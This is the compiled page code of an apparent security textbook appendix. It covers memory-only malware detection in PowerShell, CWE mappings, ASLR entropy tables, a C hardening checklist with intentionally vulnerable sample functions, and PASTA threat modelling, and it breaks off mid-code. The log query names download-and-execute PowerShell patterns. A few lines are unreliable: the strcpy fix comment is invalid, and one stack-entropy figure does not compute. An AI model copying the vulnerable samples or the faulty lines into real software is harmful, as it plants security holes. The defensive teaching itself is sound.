      children: "Extended Malware Analysis: Memory-Only Malware Detection"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "detecting-reflective-dll-injection",
      children: "Detecting Reflective DLL Injection"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-powershell",
        children: "# PowerShell detection of anomalous memory regions\n# Reflective DLLs are loaded from memory (no backing file on disk)\n$processes = Get-Process\n\nforeach ($proc in $processes) {\n    try {\n        $modules = $proc.Modules\n        foreach ($mod in $modules) {\n            # Modules loaded from memory have empty FileName or unusual paths\n            if ($mod.FileName -eq \"\" -or $mod.FileName -match \"^\\\\\\\\\") {\n                Write-Warning \"Suspicious module in $($proc.Name): $($mod.ModuleName)\"\n            }\n            # Check for unsigned modules in critical processes\n            if ($proc.Name -in @(\"svchost\", \"lsass\", \"winlogon\", \"csrss\")) {\n                # Would need digital signature check here\n                Write-Verbose \"Critical process $($proc.Name) loaded $($mod.ModuleName)\"\n            }\n        }\n    }\n    catch {\n        # Access denied → possible rootkit hiding modules\n        Write-Warning \"Cannot access modules for $($proc.Name) → possible hooking\"\n    }\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "amsi-bypass-detection",
      children: "AMSI Bypass Detection"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-powershell",
        children: "# Windows Script Block Logging (Event ID 4104) captures PowerShell script content\n# Even obfuscated scripts leave traces\n\n# Enable enhanced logging via GPO or registry:\n# HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging → EnableScriptBlockLogging = 1\n\n# Query script block logs for suspicious patterns\nGet-WinEvent -FilterHashtable @{\n    LogName   = 'Microsoft-Windows-PowerShell/Operational'\n    ID        = 4104\n} | Where-Object {\n    $msg = $_.Message\n    $msg -match 'FromBase64String|Invoke-Expression|IEX\\s*\\(' -or\n    $msg -match 'DownloadString|Start-Process\\s+hidden' -or\n    $msg -match '-enc\\s+[A-Za-z0-9+/=]{50,}'\n} | Select-Object TimeCreated, Id, @{n='Script';e={$_.Message.Substring(0, [Math]::Min(200, $_.Message.Length))}}\n\n# Output:\n# TimeCreated          : 6/15/2024 3:14:15 AM\n# Id                   : 4104\n# Script               : [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('...\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "extended-vulnerability-classes-and-cwe-mapping",
      children: "Extended Vulnerability Classes and CWE Mapping"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "CWE ID"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Name"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Chapter Coverage"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Example"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CWE-119"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Buffer Over-read/Overwrite"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Section 2: Buffer Overflows"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "gets(), strcpy()"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CWE-120"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Classic Buffer Overflow"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Section 2.2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Stack smashing"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CWE-122"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Heap-based Buffer Overflow"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Section 2.3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Heap metadata corruption"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CWE-134"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Use of Externally-Controlled Format String"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Section 2.5 (ASLR bypass)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "printf(user_input)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CWE-190"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Integer Overflow or Wraparound"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Section 6: Secure Coding"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "malloc(user_size + 16) wrap"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CWE-362"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Race Condition (TOCTOU)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Section 6: Design"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "File open-check race"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CWE-416"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Use After Free"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Section 2.3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Dangling pointer after free()"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CWE-476"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "NULL Pointer Dereference"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Section 6: Coding"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unchecked malloc return"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CWE-502"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Deserialization of Untrusted Data"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Section 6.2.2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "readObject()"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CWE-78"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "OS Command Injection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Section 6.2.3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "exec(user_input)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CWE-79"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cross-Site Scripting"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Section 6.2.3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "innerHTML = userInput"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CWE-89"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SQL Injection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Section 6.2.2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Raw query concatenation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CWE-94"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Code Injection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Section 6.2.3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "eval(user_input)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CWE-200"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Information Exposure"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Section 2.5"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Format string read"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CWE-269"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Improper Privilege Management"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Section 1"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SUID binaries"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CWE-284"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Improper Access Control"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Section 6: Design"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Missing authorization check"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CWE-787"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Out-of-bounds Write"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Section 2: All overflows"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Core of memory corruption"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CWE-789"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Uncontrolled Memory Allocation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Section 6"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "alloca with user size"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CWE-798"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hard-coded Credentials"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Section 6: Secure Coding"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Password in source"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "extended-aslr-entropy-details",
      children: "Extended ASLR Entropy Details"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "linux-aslr-entropy-by-architecture-and-kernel-version",
      children: "Linux ASLR Entropy by Architecture and Kernel Version"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Check ASLR entropy on current system\ncat /proc/sys/kernel/randomize_va_space\n# 0 = ASLR off\n# 1 = Randomize stack, mmap, shared libraries (partial → PIE off)\n# 2 = Full randomization (stack, mmap, heap, PIE, vDSO)\n\n# View memory layout of a process\ncat /proc/self/maps\n# 555555554000-555555557000 r--p 00000000 08:05 12345    /bin/cat (PIE base)\n# 7ffff7dce000-7ffff7df5000 r-xp 00000000 08:05 67890    libc.so.6 (libc base)\n# 7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0         [stack]\n\n# Check actual entropy for each region\n# On x86_64 Linux 5.4+:\n#   mmap randomization: 28 bits (256TB address space)\n#   stack randomization: 22 bits\n#   heap randomization:  13 bits\n#   PIE randomization:   28 bits\n\n# Get entropy values from kernel source documentation\n# /proc/sys/kernel/randomize_va_space = 2 provides:\n#   28672 possible stack start positions (2^22 * 8 bytes)\n#   2^28 possible mmap base positions\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "aslr-effectiveness-on-different-platforms",
      children: "ASLR Effectiveness on Different Platforms"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Platform"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Stack Entropy"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Heap Entropy"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "mmap/libc Entropy"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Overall Security"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Linux x86_64 (kernel ≥4.0)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "22 bits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "13 bits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "28 bits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Excellent"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Linux i386"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "19 bits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "8 bits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "8 bits (256 positions)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Moderate"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Windows 10 x64"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "19 bits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "5 bits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "8 bits (per session random)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Good"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Windows 10 x86"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "17 bits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "5 bits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "8 bits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Moderate"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "macOS x86_64"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "16 bits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "12 bits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "16 bits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Good"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Android (Linux 5.x)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "28 bits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "13 bits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "28 bits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Excellent"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "iOS (PAC + ASLR)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "24 bits + PAC"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "16 bits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "16 bits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Very Good"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "extended-secure-coding-cc-memory-safety-checklist",
      children: "Extended Secure Coding: C/C++ Memory Safety Checklist"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "pre-coding-decisions",
      children: "Pre-Coding Decisions"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      className: "contains-task-list",
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Choose ", (0,jsx_runtime.jsx)(_components.code, {
          children: "-fstack-protector-strong"
        }), " for all builds (default in modern GCC/Clang)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Enable ", (0,jsx_runtime.jsx)(_components.code, {
          children: "-D_FORTIFY_SOURCE=2"
        }), " for compile-time + runtime checks"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Use ", (0,jsx_runtime.jsx)(_components.code, {
          children: "-pie -fPIE"
        }), " for position-independent executables"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Enable ", (0,jsx_runtime.jsx)(_components.code, {
          children: "-z relro -z now"
        }), " for Full RELRO (GOT read-only after init)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Use ", (0,jsx_runtime.jsx)(_components.code, {
          children: "-z noexecstack"
        }), " to prevent stack execution"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " Enable AddressSanitizer (", (0,jsx_runtime.jsx)(_components.code, {
          children: "-fsanitize=address"
        }), ") for debug builds"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "during-implementation",
      children: "During Implementation"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      className: "contains-task-list",
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " NEVER use ", (0,jsx_runtime.jsx)(_components.code, {
          children: "gets()"
        }), " → use ", (0,jsx_runtime.jsx)(_components.code, {
          children: "fgets()"
        }), " or ", (0,jsx_runtime.jsx)(_components.code, {
          children: "getline()"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " NEVER use ", (0,jsx_runtime.jsx)(_components.code, {
          children: "strcpy()"
        }), " → use ", (0,jsx_runtime.jsx)(_components.code, {
          children: "strncpy()"
        }), " or ", (0,jsx_runtime.jsx)(_components.code, {
          children: "strlcpy()"
        }), " (with explicit null-termination)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " NEVER use ", (0,jsx_runtime.jsx)(_components.code, {
          children: "sprintf()"
        }), " → use ", (0,jsx_runtime.jsx)(_components.code, {
          children: "snprintf()"
        }), " with buffer size"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " NEVER use ", (0,jsx_runtime.jsx)(_components.code, {
          children: "scanf(\"%s\")"
        }), " → use ", (0,jsx_runtime.jsx)(_components.code, {
          children: "fgets()"
        }), " + ", (0,jsx_runtime.jsx)(_components.code, {
          children: "sscanf()"
        }), " with field width"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " ALWAYS check ", (0,jsx_runtime.jsx)(_components.code, {
          children: "malloc()"
        }), "/", (0,jsx_runtime.jsx)(_components.code, {
          children: "calloc()"
        }), " return for NULL"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " ALWAYS validate integer arithmetic before allocation (", (0,jsx_runtime.jsx)(_components.code, {
          children: "size > SIZE_MAX - offset"
        }), ")"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " ALWAYS null-terminate strings after ", (0,jsx_runtime.jsx)(_components.code, {
          children: "strncpy()"
        }), " → it does NOT add null if source >= n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " ALWAYS check array bounds before access"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " ALWAYS set pointers to NULL after ", (0,jsx_runtime.jsx)(_components.code, {
          children: "free()"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " NEVER pass user input as format string to ", (0,jsx_runtime.jsx)(_components.code, {
          children: "printf()"
        }), ", ", (0,jsx_runtime.jsx)(_components.code, {
          children: "fprintf()"
        }), ", ", (0,jsx_runtime.jsx)(_components.code, {
          children: "syslog()"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " NEVER use ", (0,jsx_runtime.jsx)(_components.code, {
          children: "alloca()"
        }), " with attacker-controlled size"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " NEVER assume ", (0,jsx_runtime.jsx)(_components.code, {
          children: "realloc()"
        }), " returns the same pointer"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        className: "task-list-item",
        children: [(0,jsx_runtime.jsx)(_components.input, {
          type: "checkbox",
          disabled: true
        }), " ALWAYS check that ", (0,jsx_runtime.jsx)(_components.code, {
          children: "write()"
        }), "/", (0,jsx_runtime.jsx)(_components.code, {
          children: "send()"
        }), " actually wrote all bytes (loop if necessary)"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "code-review-checklist",
      children: "Code Review Checklist"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-c",
        children: "// BAD PATTERN 1: Unbounded string copy\nvoid bad1(char *input) {\n    char buf[64];\n    strcpy(buf, input);  // strcpy(buf, input, sizeof(buf));\n}\n\n// BAD PATTERN 2: Insufficient buffer in strncpy\nvoid bad2(char *input) {\n    char buf[64];\n    strncpy(buf, input, sizeof(buf));  // NO null terminator if strlen(input) >= 64!\n    // FIX: buf[sizeof(buf)-1] = '\\0';\n}\n\n// BAD PATTERN 3: Integer overflow in allocation\nvoid bad3(size_t count) {\n    char *p = malloc(count * sizeof(char));  // overflow if count > SIZE_MAX/sizeof(char)\n    // FIX: if (count > SIZE_MAX / sizeof(char)) return;\n}\n\n// BAD PATTERN 4: Format string vulnerability\nvoid bad4(char *input) {\n    printf(input);  // printf(\"%s\", input);\n}\n\n// BAD PATTERN 5: TOCTOU race\nvoid bad5(const char *path) {\n    if (access(path, R_OK) == 0) {   // Check\n        FILE *f = fopen(path, \"r\");  // Use → path may have changed!\n        // FIX: open file first, then fstat() to verify\n    }\n}\n\n// BAD PATTERN 6: Off-by-one\nvoid bad6() {\n    char buf[10];\n    for (int i = 0; i <= 10; i++) {  // should be < 10\n        buf[i] = 'A';\n    }\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "extended-threat-modeling-pasta-process",
      children: "Extended Threat Modeling: PASTA Process"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "pasta-7-stage-threat-modeling",
      children: "PASTA 7-Stage Threat Modeling"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            style: {
              textAlign: "center"
            },
            children: "Stage"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Name"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Activities"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Output"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            style: {
              textAlign: "center"
            },
            children: "1"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Define Objectives"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Business impact, compliance, risk appetite"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security requirements, KPIs"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            style: {
              textAlign: "center"
            },
            children: "2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Define Technical Scope"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Architecture diagram, tech stack, data flows"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DFD (Data Flow Diagram)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            style: {
              textAlign: "center"
            },
            children: "3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Decompose Application"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Trust boundaries, entry/exit points, assets"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Component inventory"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            style: {
              textAlign: "center"
            },
            children: "4"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Threat Analysis"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Map threats per component, threat trees"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Threat tree diagrams"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            style: {
              textAlign: "center"
            },
            children: "5"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Vulnerability Analysis"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Map vulnerabilities to threats, CVE correlation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Vulnerability map"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            style: {
              textAlign: "center"
            },
            children: "6"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Attack Modeling"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Attack tree, STRIDE-per-interaction"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Attack scenarios with likelihood"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            style: {
              textAlign: "center"
            },
            children: "7"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Risk & Impact Analysis"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Risk scoring, residual risk, countermeasures"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Prioritized mitigation plan"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "PASTA example for a login component:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
